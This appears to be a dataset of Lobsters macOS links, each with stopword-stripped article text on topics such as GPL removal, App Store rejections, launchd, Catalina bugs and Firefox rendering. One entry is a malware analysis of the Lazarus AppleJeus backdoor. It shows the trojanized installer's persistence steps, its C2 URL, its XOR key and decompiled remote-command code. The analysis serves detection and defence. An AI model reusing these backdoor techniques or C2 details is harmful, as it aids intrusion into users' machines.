136,Lobsters,mac,Apple macOS,Apple’s great GPL purge (2012-),http://meta.ath0.com/2012/02/05/apples-great-gpl-purge/,apple great gpl purge,browse download removal samba,apple obligingly allows browse download open source software use o x since listing version o x decided take look much software using available gnu public license result gpllicensed gpllicensed gpllicensed gpllicensed gpllicensed gpllicensed gpllicensed gpllicensed packagesas remaining gplonly package seemed javascriptcore bash bc emacs efax gnudiff gnuserv gnutar groff gpatch keymgr libstdcxx man nano screen texinfo uucp include list apple stopped listing license download page make harder track trend support idea apple trying remove gpllicensed software o x removal samba gcc switched got attention number show general purging going apparently slacked bit thoughthe remaining gpllicensed package healthy either maverick ship bash current version upgrade shipping last version bash gpl version anyone apple reading got suggestion ship tmux control key rebound probably nobody care much removed screen must usable version man bc freebsd anyway message pretty obvious apple ship anything licensed gpl o xthere two big change gpl first explicitly prohibits patent lawsuit people actually using gpllicensed software ship second carefully prevents tivoization locking hardware people actually run software wantso thing planning o x guess plan allow io o x built underlying set also intrigued see far prepared go already annoyed inconvenienced lot people samba gcc removal
137,Lobsters,mac,Apple macOS,You Cannot Submit an Electron 6 (or 7) App to the Apple Store,https://david.dev/you-cannot-submit-an-electron-6-or-7-app-to-the-apple-store,submit electron app apple store,previous chapter one issue back home,allright follow previous chapter odyssey state apparently submit electron app apple store first refusal apple state app app link following nonpublic framework cacontextcalayerhostnsaccessibilityremoteuielementnsnextstepframensthemeframensurlfiletypemappingsi one issue write back apple trying explain using electron ca nt really change publicframework usage assume something chromium reply hello thank providing informationregarding app us reference following nonpublic apis access binary unsure remove apis question please contact service provider technical supportsand also would pay extra care next paragraph next stepsif using thirdparty library please update recent version library access library source may able search compiled binary using string otool command line tool string tool output list method library call otool ov output objectivec class structure defined method tool help narrow problematic code residescontinuing use conceal nonpublic apis future submission app may result termination apple developer account well removal associated apps app store summarise appears way even try repackaging using electron anecdotally another app approved yet nt name app app link following nonpublic framework issue claim electron apps rejected certainly worrying back home
138,Lobsters,mac,Apple macOS,Technical Deep Dive: How does Retroactive work?,https://medium.com/@cormiertyshawn895/deep-dive-how-does-retroactive-work-95fe0e5ea49e,technical deep dive retroactive work,download xcode category nsobject put n hipster hat revise swizzling skill id bool return void self selector,stack trace fascinating look like sort access violation initializing font going fix swizzling comapplecoretext ctfontgetclientobject comappleuifoundation uifontgetextradata comappleuifoundation nsfont initwithtypefaceinfo key renderingmode comappleprokit nsprofont prosystemfontwithfontname pointsize fontappearance usesystemhelveticaadjustments comappleprokit nscell proappearanceextensions prosetfont comappleappkit nstextfieldcell setfont comappleappkit nstextfieldcell init comappleappkit nsibobjectdata nibinstantiatewithowner option toplevelobjects comappleappkit nsnib instantiatenibwithexternalnametable option comappleappkit nsnib instantiatewithowner option toplevelobjects comappleappkit nsviewcontroller loadview comappleappkit nsviewcontroller loadviewifrequired comappleappkit nsviewcontroller view comappleappkit nswindowcontroller windowdidload comappleappkit nswindowcontroller window create new framework xcode swizzle broken method aperture fill selector removedit swizzle time swizzle existing app course use xcodeif xcode yet download xcode create new xcode project macos framework templatemake sure language objectiveccreate new filecreate objectivec filethe easiest way swizzle something make category nsobject call methodexchangeimplementations load name file swizzling name whatever wantif want swizzle problematic initializer nsprofont time put n hipster hat revise swizzling skillsimport objectivec runtime header let fun beginimport objcruntimeh refer back problem report suspect comappleprokit nsprofont prosystemfontwithfontname pointsize fontappearance usesystemhelveticaadjustments obvious idea initialize regular system font instead whatever special pro font aperture trying failing initialize nsfont swizzledprosystemfontwithfontname nsstring name pointsize cgfloat size fontappearance id appearance usesystemhelveticaadjustments bool adjustment return nsfont systemfontofsize size use dynamic objectivec runtime exchange aperture implementation void load methodexchangeimplementations classgetclassmethod nsclassfromstring nsprofont nsselectorfromstring prosystemfontwithfontname pointsize fontappearance usesystemhelveticaadjustments classgetclassmethod self class selector swizzledprosystemfontwithfontname pointsize fontappearance usesystemhelveticaadjustments wishful thinking initializing font fail probably get u next step
139,Lobsters,mac,Apple macOS,"Apple, Your Developer Documentation is… Missing",https://v4.chriskrycho.com/2019/apple-your-developer-documentation-is-garbage.html,apple developer documentation missing,assumed audience rightly pointed learning wrote made official policy,assumed audience practitioner interested lookerson software apple edit folk rightly pointed use garbage suggests problem quality existing documentation retitled post capture problem massive absence documentation see original title way slug past month trying get speed apple developer ecosystem part working rewrite project mean learning swift swiftui barely io macos apis terrible number part ecosystem entirely undocumented frankly shocking context spent last five year working actively javascript frontend application development world working first angularjs emberjs ember doc reputation pretty bad year working gone decent really good hand working angularjs year ago often threw hand quiet despair utter lack explanation occasionally inane explanation core concept thought would absolute worst massive tech company case google providing public apis could possibly wrong current state apple software documentation worst ever seen framework anywhere swift relatively well covered courtesy wellwritten wellmaintained book good news end swiftui entirely even single line explanation given type modifier swift package manager okay doc finding limit official doc difficult impossible got ground truth stack overflow question repeatedly reduced searching wwdc video transcript figure someone say something relevant whatever working frankly unacceptable ember ecosystem simple rule code get ship unless documented go rust know wrote rfc made official policy understand apple api developer often work different context open source face crunch around release tied hardware product shipping end day vending api done documented full stop given know apple approach problem individual engineer responsible writing doc even member dedicated documentation team responsible writing doc make le failure apple engineering organization job api engineering organization support consume api doubt many apple api engineer would love thing documented likewise doubt documentation team understaffed work wrong doubt apple engineering culture value even worse indictment engineering culture kind thing change level entire engineering organization apple claim interested building platform accessible brand new developer experienced grayhaired folk around since next day right even close decade software development belt fair bit language rich type system functional programming idiom stuff hard figure imagine mindbogglingly terrible experience would someone starting software coming experience language like ruby python javascript would completely impossible learn apple want developer love good developer want flee worried web everywhere microsoft coming need take seriously adopt mentality served framework language well documented done
140,Lobsters,mac,Apple macOS,Convert [UInt8] to Int,https://forums.swift.org/t/convert-uint8-to-int/30117,convert int,,lot always parsing network packet weirdo data structure experience best way bytewise example little endian let byte let bytesreversed reduce sofar byte return sofar byte print string radix drop reversed big endian using unsafe pointer pain number reason unsafe simple mistake ruin whole day easy make mistake example code convert pretty darned rare find network protocol us int remember int change size depending architecture worry type punning worry memory alignment worry big little endian admittedly code deal little big endian assemble multibyte integer bytebybyte hard forget problem get wrong clearly case dealing unsafe pointer right choice imo first choice share enjoy quinn eskimo dts apple
141,Lobsters,mac,Apple macOS,Scheduling jobs with launchd and friends,https://www.monades.dev/scheduling-jobs-with-launchd-and-friends/,scheduling job launchd friend,launchdplist man page start process described man page subscribe,tried schedule job first time macos faced old news apple deprecated good old cron favor launchd family utility launch debug job believe cron going outlive u decided use launchd allows running job computer wake sleep note took process launchd make distinction daemon process run root agent process run user describe job use property list file plist file plist file use xml syntax describe job depending located fulfill different purpose location purpose librarylaunchagents peruser agent provided user librarylaunchagents peruser agent provided administrator librarylaunchdaemons systemwide daemon provided administrator systemlibrarylaunchagents peruser agent provided apple systemlibrarylaunchdaemons systemwide daemon provided apple system boot kernel running launchd run finish system initialization part initialization go following step load parameter launchondemand systemlevel daemon property list file found systemlibrarylaunchdaemons librarylaunchdaemons register socket file descriptor requested daemon launch daemon requested running time request particular service arrive launch corresponding daemon pass request system shuts sends sigterm signal daemon basic form plist file requires key defined description valid key located launchdplist man page notable key startinterval startcalendarinterval allows define time interval run process key startcalendarinterval key dict key minute key integer integer key hour key integer integer key day key integer integer dict one first thing want enable logging know going process need set debug true provide path standard output error output key standardoutpath key string varlogmyjoblog string key standarderrorpath key string varlogmyjoblog string key debug key true tip file must directory writing access job right folder either restart computer make load instruct launchctl load process launchctl load librarylaunchagentscommyprocessplist make change pid file want reload script twostep process launchctl unload librarylaunchagentscommyprocessplist launchctl load librarylaunchagentscommyprocessplist convenient alternative editing launchdplist service reloading use launchctl trigger debug process sudo launchctl debug gui uidcommyprocessplist stdout stderr note uid user id variable automatically set launchctl listening need open another terminal tab start process described everything logged listening tab note launchctl debug allows many check man page kickstart process time launchctl start commyprocessplist subscribe try post week interesting stuff programming nix web like notified new post go subscribe form
142,Lobsters,mac,Apple macOS,Six Reasons Why iOS 13 and Catalina Are So Buggy,https://tidbits.com/2019/10/21/six-reasons-why-ios-13-and-catalina-are-so-buggy/,six reason io catalina buggy,overloaded feature list lead schedule chicken crash report identify noncrashing bug lessimportant bug triaged regression get fixed old bug get ignored automated test used sparingly complexity ballooned looking forward,io macos catalina unusually buggy release apple beta started buggy wwdc june unexpected even apple removed feature final release september problem forced company publish quick update based year experience working apple software engineer idea overloaded feature list lead schedule chicken apple aggressive including significant feature upcoming product tight schedule ambitious feature set mean software engineer quality assurance qa engineer routinely work night weekend deadline approach inevitably feature postponed future release saw icloud drive folder sharing wellrun project feature lagging behind cut early engineer devote time polishing feature actually ship sometimes manager play schedule chicken since one want admit departmental meeting part project behind instead hope someone else working another aspect feature running even later reap benefit feature delayed without taking hit one delayed one blink engineer continue work feature possibly completed time eventually get pushed future release apple could address scheduling problem packing many feature release company culture product set release schedule like airpods rumored bluetooth tracking tile delayed really solid product annual release schedule like iphones operating system must ship september whatever state crash report identify noncrashing bug reporting turned recommend apple builtin crash reporter automatically report application crash even kernel crash back company crash report includes lot data especially useful stack trace show exactly code crashed importantly got point stack trace often enables engineer track crash fix crash report uniquely identified stack trace stack trace multiple crash report mean user seeing crash crash reporter backend sort crash report matching stack trace occur often get highest priority apple take crash report seriously try hard fix result apple software crash lot le used unfortunately crash reporter catch noncrashing bug blind photo never upload icloud contact card sync mac iphone time capsule backup get corrupted restarted every month setup app new iphone got caught loop repeatedly asking sign icloud account call apple support real problem experienced apple track noncrashing bug oldfashioned way human tester qa engineer automated test report thirdparty developer apple support needle say approach much art science much harder identify noncrashing bug particularly report apple support engineer track lessimportant bug triaged development apple triage bug based phase development cycle bug severity alpha engineer fix pretty much bug want development move alpha beta serious bug block major feature fixed ship date nears bug cause data loss crash get fixed approach sensible engineer every time change code chance introduce new bug change also trigger whole new round testing close shipping known bug understood impact better adding fix might break something new unaware bug generate lot apple store visit support call usually get fixed cost serious money pay enough support rep help lot user much cheaper fix bug worked apple product get list top bug driving apple store visit support call expected fix unfortunately bug rare terribly cause mere confusion instead data continually pushed back burner triage system regression get fixed old bug get ignored apple lousy fixing old bug apple pay special attention new product like iphone looking serious customer problem jump quickly generally good job eradicating major issue bug minor unusual enough survive early scrutiny may persist forever remember said change causing new bug engineer accidentally break working feature called regression expected fix file bug report qa engineer determines bug also exists previous release software marked regression definition new bug old bug chance one ever assigned fix group apple work way many drove crazy one group knew apple even made regression tshirts bug regression fix icloud photo upload bug contact syncing bug mentioned may never fixed automated test used sparingly software industry go fad like fashion industry automated testing currently fashionable various type automated testing testdriven design unit test userdriven testing etc need go detail except say apart specific area apple lot automated testing apple highly reliant manual testing probably much significant area automated testing battery performance every day operating system build loaded onto device iphones ipads apple watch etc run set automated test ensure battery performance degraded course automated test look apple code realworld interaction often significant battery performance issue tracked fixed manually beyond battery group inside apple known use automated test safari probably famous every code checkin trigger performance test checkin slows safari performance rejected automated testing would probably help apple software quality complexity ballooned another complication apple continually growing complexity ecosystem year ago apple sold mac processor one core program line code large singlethreaded modern apple operating system ten million line code mac iphone ipad apple watch airpods homepod talk talk icloud apps multithreaded communicate one another imperfect internet today apple product vastly complex past make development testing harder test matrix row feature o version also dimension compatible product test worse asynchronous event like multiple thread running multiple core push notification network latency mean practically impossible create comprehensive test suite looking forward unprecedented move apple announced io io shipped rare admission serious software quality problem apple immense resource company engineer tame year problem short term expect bug fix update frequent schedule past year longerterm sure higherups apple fully aware problem pondering best address besides fact bug expensive support cost engineer time starting become public relation concern apple charge premium price premium product lapse software quality stand hurt company reputation david shayer apple software engineer year worked ipod apple watch apple bugtracking system radar among project
143,Lobsters,mac,Apple macOS,Dramatically reduced power usage in Firefox 70 on macOS with Core Animation,https://mozillagfx.wordpress.com/2019/10/22/dramatically-reduced-power-usage-in-firefox-70-on-macos-with-core-animation/,dramatically reduced power usage firefox macos core animation,reported charlie siegel vivek kapoor atiensivu technical detail apple opengl documentation nsopenglcontext nsview nsopenglcontext setview nsopenglcontext flushbuffer corresponding api full support partial redraws enter core animation calayer iosurface content catransaction firefox core animation compositor compositor finally partial redraws tiled multiple square core animation layer additionally split transparent opaque part quartz debug future work acknowledgement bugzilla bug already done question answer nonwebrender nonnvidia android cametallayer intel power gadget like,firefox changed pixel get screen macos allows u le work per frame small part screen change result firefox drastically reduces power usage browsing power usage watt displayed intel power gadget lower number better short firefox improves power usage many use case larger firefox window smaller animation bigger difference user reported much longer battery life cooler machine le fan spinning seeing huge improvement macbook pro scaled resolution internal display well external display prior update literally use firefox would spin fan way slow whole computer thank happy finally see core animation implementedcharlie siegel many year able use firefox mac used test every firefox release nothing worked pastvivek kapoor usually try nightly build every week end going back edge chromium chrome speed lack heat make mbp without dedicated dgpu become power sipper compared earlier buildsatiensivu read technical detail behind change technical detail let take brief look firefox compositing pipeline work three major step getting pixel screen step firefox draw pixel gecko layer step firefox compositor assembles gecko layer produce rendering window step operating system window manager assembles window screen produce screen content improvement firefox result reducing work step step work entire window even small part window updating compositor always redrawing entire window main reason lack convenient apis macos partial compositing firefox compositor macos make use hardware acceleration via opengl apple opengl documentation recommends following method getting opengl content screen create nsopenglcontext attach nsview using nsopenglcontext setview render context default framebuffer filling entire framebuffer fresh content end frame call nsopenglcontext flushbuffer update screen rendered content crucial limitation flushbuffer give way indicate part opengl context changed limitation exist window window corresponding api full support partial redraws every firefox window contains one opengl context cover entire window firefox using api described always redrawing whole window every change window manager always copying entire window screen every change turned problem despite fact draw fully hardware accelerated enter core animation core animation name apple framework let create tree layer calayer layer usually contain texture pixel content layer tree defines position size order layer within window starting macos window use core animation default way share rendering window manager core animation api let u indicate area inside opengl context changed unfortunately however provides number useful capability almost good case even better first foremost core animation let u share gpu buffer window manager way minimizes copy create iosurface render directly using opengl treating offscreen framebuffer assign iosurface calayer window manager composite calayer onto screen surface read directly gpu buffer additional copy iosurface macos api provides handle gpu buffer shared process worth noting ability assign iosurface calayer content property properly documented nevertheless major browser macos make use api secondly core animation let u display opengl rendering multiple place within window time update synchronized fashion possible old api using without core animation would needed create multiple nsviews nsopenglcontext call flushbuffer context every frame would guarantee rendering different context would end screen time core animation group update multiple layer catransaction screen updated atomically multiple layer allows u update part window whenever layer mutated way window manager redraw area includes bound layer rather bound entire window mark individual layer opaque transparent cut window manager work area window contain opaque layer old api part opengl context default framebuffer transparent needed make entire opengl context transparent lastly core animation allows u move rendered content around window cheaply great efficient scrolling current compositor yet make use capability future work webrender take advantage firefox core animation compositor make use capability firefox important change firefox full control swap chain past asking doublebuffered opengl context rendering default framebuffer relying builtin swap chain every frame could guess existing framebuffer content probably two frame old could never know sure ignored framebuffer content rerendered entire buffer new world firefox render offscreen buffer creation know exactly pixel buffer need updated pixel still contain valid content allows u reduce work step drastically compositor finally partial redraws change responsible power saving addition firefox window tiled multiple square core animation layer whose content rendered separately cut work step finally firefox window additionally split transparent opaque part transparent calayers cover vibrant portion window opaque layer cover rest window save work step also mean window manager need redraw vibrancy blur effect unless something vibrant part window change rendering pipeline firefox macos look follows step firefox draw pixel gecko layer step square calayer tile window firefox compositor combine relevant gecko layer redraw changed part calayer step operating system window manager assembles updated window calayers screen produce screen content use quartz debug app visualize improvement step using flash screen update setting see window manager repaint area firefox right lot smaller tab loading background screenshot show opaque region feature see firefox mark window opaque green future work planning build onto work improve browsing use case scrolling full screen video made even efficient using core animation smarter way targeting webrender optimization allow u ship webrender macos without power regression acknowledgement implemented change patch distributed among bugzilla bug matt woodrow reviewed vast majority patch would like thank everybody involved hard work thanks firefox contributor mark identified severity problem early provided sound evidence helpful testing thanks tester made sure change introduce bug everyone followed along bugzilla research phase project chrome source code public chrome development note turned invaluable resource chrome developer mostly chris cameron already done hard work comparing power usage various rendering method macos finding accelerated research allowed u implement efficient approach right start question answer similar problem platform firefox us partial compositing platform gpu combination notably partial compositing enabled firefox window nonwebrender nonnvidia system reasonably recent version window system hardware acceleration firefox currently use partial compositing linux androidopengl macos deprecated would metal posed similar problem way yes way fundamentally order get metal content screen use core animation need cametallayer however apis partial update cametallayers either need implement solution smaller layer similarly done firefox planning add metal backend webrender future stop using opengl machine support metalwhy problem power usage get worse firefox far aware power problem start firefox quantum opengl compositor always drawing entire window ever since firefox first version firefox came hardware acceleration believe problem became serious time simply screen resolution increased especially switch retina resolution big jump number pixel per windowwhat browser chrome compositor try use core animation much fallback path rare unhandled case safari compositor entirely core animation based safari basically skip step hardware accelerated rendering high power cost per pixel huge degree change affected power usage surprised u come explanation question probably deserves blog post summary low level compositing work step step copying memory using gpu integrated gpus share cache main memory cpu also share memory bandwidth compositing mostly memory bandwidth limited destination pixel read source texture pixel read destination pixel writes pushed back memory screen worth pixel take around default scaled retina resolution usually big cache example cache machine big screenful one layer compositing take memory bandwidth machine memory bandwidth screenful compositing take millisecond believe gpu run full frequency wait memory estimate power usage checking long gpu run framehow affect webrender architecture point webrender redraw entire window every frame finding informed substantial change webrender architecture webrender adding support native layer caching unnecessary redraws avoided webrender still aim able redraw entire window full frame rate take advantage caching order reduce power usage able paint quickly allows flexibility fewer performance cliff making layerization decisionsdetails measurement chart number collected test run macbook pro retina early intel hd graphic macos default firefox window size new firefox profile resolution medium display brightness number come pkg measurement displayed intel power gadget app power usage idle state machine subtracted baseline displayed value number chart order get sense firefox contribution number used chart subtraction idle baseline scrolling square video doc idle audio player animation low complexity animation medium complexity animation high complexity scenario user reported even higher impact change test machine showed seem large variation power usage compositing different mac model like like loading
144,Lobsters,mac,Apple macOS,A survey of Apple developer documentation,https://nooverviewavailable.com/,survey apple developer documentation,survey apple developer documentation nshipster project available github,survey apple developer documentation nshipster project source code available github last generated september content copyright apple inc right reserved
145,Lobsters,mac,Apple macOS,Firefox Nightly on Mac OS improving battery life & performance by using CoreAnimation,https://appleinsider.com/articles/19/09/03/firefox-macos-test-build-is-far-better-for-your-battery-life,firefox nightly mac o improving battery life performance using coreanimation,nightly version data shared version,firefox macos soon beneficial macbook air macbook pro user want preserve battery life nightly build mozillaproduced browser requiring little third power main public release render web page nightly version firefox socalled updated every night testing development release browser sits developer edition public release improvement close used normal user pushed nightly preparation one recent addition browser helping reduce power consumption macos user highlighted developer henrik skupin user firefox nightly macos see huge decrease power usage factor loading webpage change revolves around using coreanimation rendering cut amount power required process according data shared mozilla bug ticketing system accessing webpage requires watt watt power render without coreanimation gpu power draw watt watt nightly build september test page used watt watt gpu usage watt potentially beneficial macbook user nt available use main release browser yet unclear benefit reach release channel future inclusion nightly build good sign could arrive soon possibly part version scheduled arrive october tuesday version main firefox release bring benefit macos user macbook pro user dual graphic card see browser switch lowerpowered gpus aggressively cutting power usage also macos user download progress file visible within finder release change include stronger privacy element enhanced tracking protection etp including blocking thirdparty tracking cooky cryptominers default enhanced block autoplay feature support receiving multiple video codecs
146,Lobsters,mac,Apple macOS,Pass the AppleJeus,https://objective-see.com/blog/blog_0x49.html,pas applejeus,cleanmy mac x osxapplejeus sample background malwrhunterteam undetected malwrhunterteam applejeus writeup presentation http wwwjmttradingorg http githubcomjmttradingjmttraderreleases tweet infected macos disk image whatsyoursign detailed analysis connection lazarus apt group operation applejeus lazarus hit cryptocurrency exchange fake installer macos malware detection blockblock knockknock lulu netiquette conclusion malwrhunterteam security tool patreon,pas applejeus mac backdoor written infamous lazarus apt group october research tool writing supported friend objectivesee today blog post brought cleanmy mac x want play along shared osxapplejeus sample password infect background friday malwrhunterteam tweeted interesting malware time said tweet sample undetected engine virustotal twitter thread malwrhunterteam also noted malware may seen least closely related previous specimen analyzed kaspersky osxapplejeus applejeus kaspersky original writeup detailed interesting attack whereas lazarus apt group targeted various cryptocurrency exchange fake installer macos malware one interesting aspect operation apt group actually fabricated entire fake company celas trade pro website order increase realism attack victim infected help trojanized cryptocurrency trading application recommended company email turned unsuspecting employee company willingly downloaded thirdparty application legitimate looking website part recent rsa presentation highlighted attack well sample looking today appears follow identical approach infect macos target first new company created jmt trading hosted http wwwjmttradingorg look reasonably legitimate ya following download github link take u http githubcomjmttradingjmttraderreleases contains various file download file contain malware noted another recent tweet attacker appeared already updated hosted file replacing malicious one pristine version shared infected macos disk image containing applejeus malware password comprehensively examine jmttradermacdmg disk image shasum downloadsjmttradermacdmg downloadsjmttradermacdmg mounting disk image reveals single file jmttraderpkg hdiutil attach jmttradermacdmg expected volumesjmttrader l volumesjmttrader jmttraderpkg favorite tool statically analyzing pkg file application aptly named suspicious package available download via app let take peek jmttraderpkg seen package signed contains postinstall script contains actual installation instruction using suspicious package app view content install file binsh applicationsjmttraderappcontentsresourcesorgjmttradingplist librarylaunchdaemonsorgjmttradingplist librarylaunchdaemonsorgjmttradingplist libraryjmttrader applicationsjmttraderappcontentsresourcescrashreporter libraryjmttradercrashreporter x libraryjmttradercrashreporter maintain short install script installs launch daemon plist orgjmttradingplist installs daemon crashreporter executes said daemon maintain command line parameter note requires administrative privilege malware kindly ask privilege installation daemon plist binary originally embedded application jmttraderapp found within pkg specifically hidden file found resource directory resourcesorgjmttradingplist resourcescrashreporter using suspicious package app extract file analysis first let look launch daemon plist orgjmttradingplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string orgjmttradingjmttrader string key programarguments key array string libraryjmttradercrashreporter string string maintain string array key runatload key true dict plist expected reference daemon libraryjmttradercrashreporter programarguments array runatload set true macos automatically start daemon every time system rebooted crashreporter binary via file command determine file type macho file downloadscrashreporter downloadscrashreporter macho executable using whatsyoursign utility easily ascertain codesigning status though signed signed adhoc running string command affords u valuable insight likely functionality binary string downloadscrashreporter contentdisposition formdata name montjpg beastgoccom http sgrepmonuxphp post window nt khtml like gecko x pmk always run string command flag instruct scan entire file printable string output string command see interesting well string beastgoccom http sgrepmonuxphp likely download c c server window nt binary useragent perhaps useful ioc x pmk perhaps encryption decryption key detailed analysis time dive tear apart crashreporter binary let pop virtual machine start detailed analysis binary main function actual rather simple due named function rather informative main int int int int strcmp maintain goto exit maketoken chdir loop rcx rbx rcx conntobase sleep usleep rax listenmessage rcx rax rcx rbx rbx sleep goto loop exit return decompilation ascertain following malware expects executed single commandline argument maintain recall malware persisted argument passed via launch daemon plist generating random token malware enters loop loop invokes function named conntobase conntobase function succeeds invokes function named listenmessage start malware debugger lldb making sure set required argument lldb crashreporter lldb target create crashreporter current executable set crashreporter lldb setting set targetrunargs maintain first set breakpoint conntobase function address conntobase malloc malloc bzero bzero gtoken gversion getpid rax sendtobase rdi rbx rax rax strcmp rbx else rbx rax rbx return rax allocating two buffer conntobase function initializes one buffer randomly generated token binary version gversion process pid version found set likely indicating version binary dd conntobase function invokes function named sendtobase get shortly function return exactly three byte set string conntobase return indicating success recall main function sitting loop wait upon success invoke listenmessage function sendtobase function guessed connect c c server correct though function rather long logic summarized follows construct url c c server http beastgoccomgrepmonuxphp crashreporter sendtobase callq sprintf target crashreporter stopped lldb x rsi http sgrepmonuxphp lldb x rdx beastgoccom note url resolved time analysis still responsive encrypt passed data generated token binary version gversion process id lea rcx qword cbciv xor loop mov edx eax edx mov dl byte rdxrcx xor byte dl inc rax cmp rbx rax jne note xor encryption key stored variable named cbciv lldb x x pmk send http post request http beastgoccomgrepmonuxphp containing following data lldb x formdata name token formdata name query rnrnconnrn formdata name content filename montjpg rncontenttype rn value token query content montjpg hardcoded binary movabs rax content movabs rcx montjpg data token version pid xor encrypted callback block set via datataskwithrequest completionhandler callback parse response c ampc server specifically length response checked nonzero byte response extracted length rax length rax getbytes length rax first time sendtobase function invoked via conntobase function succeeds c c server return three byte containing string lldb target crashreporter stopped lldb x recall code return back main function listenmessage function executed conntobase sleep listenmessage listenmessage function invokes sendtobase function par encrypted response c c server depending response performs various action word expecting tasking remote server listenmessagev gtoken rax rax rax cbciv rax rax rbx rax tasking command strcmp exit goto exit strcmp kcon goto kcon isstrstartwith goto unfortunately analysis c c server return tasking however via static analysis fairly easily ascertain malware capability example malware support exit command unsurprisingly cause malware exit strcmp exit goto exit bzero sendtobase gtoken free free exit malware receives command appears contain logic open write file ie upload file c c server infected host isstrstartwith open file rax fopen wb perhaps get file content c c server sendtobase gtoken decrypt rax rax rax cbciv rax rax rbx rax write disk fwrite rbx close fclose command cause malware invoke function named proccmd rbx isstrstartwith stand goto rax proccmd proccmd function appears execute command via shell specifically via popen api proccmd int int unsigned int bzero sprintf rax popen r man popen file popen const char command const char mode popen function open process creating bidirectional pipe forking invoking shell command argument pointer nullterminated string containing shell command line command passed binsh using c flag interpretation performed shell ability remotely execute command clearly give remote attacker full extensible control infected macos system connection lazarus apt group noted closelyrelated sample previously analyzed kaspersky writeup titled operation applejeus lazarus hit cryptocurrency exchange fake installer macos malware question arises sample related actually fairly easy question conclusively yes highlight several undeniable similarity identicalities infection mechanism essentially identical attack apt group created legitimately looking cryptocurrency company hosted malware pkgs attack share similar layout specifically postinstall script persistently install malware launch daemon extracting hidden plist application resource directory though sample signed neither signed apple developer id rather unusual malware sample persisted launch daemon require single commandline argument order execute comparing two sample though logic inverted likely due compiler difference following code snippet illustrate similarity main check arg strcmp checkupdate go main check arg strcmp maintain exit kaspersky original analysis another lazarus backdoor stated apparently commandline argument way prevent detection malicious functionality via sandbox even reverse engineering previously seen technique adopted lazarus group attack bank still using almost every attack investigated many similarity sample eg constant etc highlight strong relationship two attack example sample look c c server return three byte sample qstring fromasciihelper qstring compare rax sample strcmp imho without doubt malware specimen written apt group lazarus however though malware sample written apt group sample first noted kaspersky writeup previous lazarus backdoor backdoor implemented using crossplatform qt framework sample looked today solely created macos crossplatform code previous backdoor also collect basic system information host name o type version system architecture o kernel type version today specimen appear contain functionality finally command supported today sample appear unique sample say command string exit kcon appear specimen previously analyzed kaspersky recall also malware analyzed today contained version string dd sample precursor comprehensive sample uncovered analyzed kaspersky perhaps completely separate lazarus backdoor detection malware particularly sophisticated actually fairly easy detect unfortunately time analysis engine virustotal detected malware noted particular av engine virustotal said engine may one small piece complete security product say comprehensive security product may also include behaviorbased engine included virustotal perhaps could generically detect new threat course behaviorbased tool problem detecting malware malicious activity even priori knowledge malware first blockblock alert malware attempt persist launch daemon similarly system scanned knockknock show malware persistent launch daemon lulu installed generate alert malware attempt connect c c server tasking finally netiquette enumerates active network connection show malware connection remote c c server term manual detection iocs following suffice malware launch daemon plist file librarylaunchdaemonsorgjmttradingplist malware persistent binary installed libraryjmttradercrashreporter running p aux grep jmttradercrashreporter root libraryjmttradercrashreporter maintain conclusion everyday get new macos malware specimen tear apart especially one written reasonably sophisticated apt group mahalo malwrhunterteam uncovering sample bringing attention today analyzed new lazarus backdoor affords remote attacker complete command control infected macos system worry getting infected probably unless employee working cryptocurrency exchange either way free largely opensource security tool generically provide protection macos threat love blog post andor want support research tool support via patreon page
147,Lobsters,mac,Apple macOS,Broken - A Developer's Experience with macOS Catalina,https://tyler.io/broken/,broken developer experience macos catalina,dumb tweet software annotated summary catalina crap noticed far allow deny security icloud password shenanigan local account password shenanigan photosapp little thing anyway,nt blog post intended write fact last night drafted one problem sending background push notification amazon sn coming soon ridiculously overthetop shitstorm blew dumb tweet earlier week last thing wanted step back arena need said first apple developer specific nerd subculture identify strongest writing selling software macos since back still mac o x back apps called software apps io mac app store day one respective opening rich nt claim even successful wonderful year apps full time income part old guard mac developer around block decade half hope earned right spout stupid opinion internet occasionally apple software developer live summer beta period secondary machine recent year within virtual machine allow intricate testing seen easygoing mostly spit polish release well substantial userfacing underthehood one catalina different two particularly gruesome way get even worse combined first purely stability functional standpoint early beta catalina really really broken ok beta speak think developer happy offer input apple report bug totally fine using wonky o month spare machine test software addition apple bad part apple becoming already service company let face apple never good anything involving internet feel like could money engineer world basically already still never completely get service right dna application hardware put network layer crap ok every case obviously exaggerating make point overall track record iffy best decide overhaul cloudkit icloud drive work merge change already buggierthanusual beta o disaster ensue bug file corruption missing data broken apis fundamental thing simply stop syncing spill infect mac running stable o fault knowing better signing catalina machine personal apple id needed icloud development summer using id made thing simpler ended joking twohundred duplicated document directory random assortment duplicated file different revision swore dealing catalina icloud rest summer put new feature hold planned pick back gm everything stabilized signed icloud every catalina machine vm assumed apple would get problem sorted fall nt alone assessment strategy google around developer blog post tweet beta time period puzzling quite scary thing ultimate point want make developer making loud clear stuff broken somehow someone apple made call ok release public beta onto world buggy broken o one thing user installing know beware buggy broken o also put data jeopardy machine others linked apple id unconscionable still beta marched eventually seemed like apple realized threw towel reverted oslevel icloud change much like discoveryd number year ago read heard completely icloud catalina point assumed massive rollback would fix thing apple officially released catalina public week without much press release headsup developer yes gm build still would email developer ahead time difficult ready upgrade go allin perhaps naive truly care experience software customer mean live system even mean dealing o bug could nt fixed time release damn go highlight lowlights run guess thesis final well first catalina release along outright awful public beta make think one thing apple insistence annual bigsplash release cycle fundamentally breaking engineering know privy internal decision making software feature depend hardware release viceversa planned timed year halfdecades advance think explanation marketing alone purely charge thing ship else would stuff completely broken lacking attention detail apple known ahem market shipped meet arbitrary deadline apple many ball air metaphor nt really make sense typing interconnected apple service company service company must find way ship feature fix update outside runup holiday season need oh god word make want vomit agile annotated summary catalina crap noticed far allow deny let start infamous tweet day influencer screenshot absolutely manipulated make point everything real security warning permission dialog ran screenshotted arranged maximum effect imac first startup installing catalina well ten minute poking around launching apps point hoping probably failed make many thousand way smarter people inside apple frightening popup frenzy absolutely condition nontechnical user blindly click allow best solution could arrive ship time maybe countless user study determined really safest best approach doubt think combination poor management hard deadline probably cavalcade upper management clevel executive use io daily driver simply lack imagination experience technical vision realize modal popup flow kind work touch device scale overlapping multiplewindow keyboard cursor driven interface ie desktop computer security let go ahead silence hacker news crowd openly admit yes geek developer technical person definitely normal user said need imnotadummy switch system preference shit broken find zero guidance apple fix number background job process imac basically treat alwayson home server run via cron others launchd run user account others root example applescript run every ten minute downloads photo server import photosapp upgrading catalina failed every time stopped cron could debug run manually first time execute terminalapp asks permission access photo directory ok prompt allow terminalapp control photosapp ok finally sure given already granted permission photo directory asks permission control finder sigh permission granted add log statement turn cron back job run fails even though granted 